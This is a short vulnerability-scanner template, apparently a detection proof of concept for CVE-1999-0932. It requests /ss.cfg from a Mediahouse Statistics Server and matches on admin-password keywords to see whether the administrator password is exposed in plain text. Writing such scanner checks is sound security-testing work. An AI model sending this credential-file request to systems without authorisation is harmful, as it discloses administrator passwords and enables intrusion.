[info]
author = "ave"
description = "验证目标服务器是否存在 Mediahouse Statistics Server 管理员密码明文泄露漏洞，通过访问 ss.cfg 配置文件检查是否以明文存储管理员密码"
id = "POC-AVE-1999-0731"
name = "CVE-1999-0932 Mediahouse Statistics Server Admin Password Disclosure PoC"
severity = "high"
tags = ["ave-1999-0731"]
vuln_id = [
    "CVE-1999-0932",
    "AVE-1999-0731",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/ss.cfg"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "ADMINPASS",
    "password",
    "adminpass",
]

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
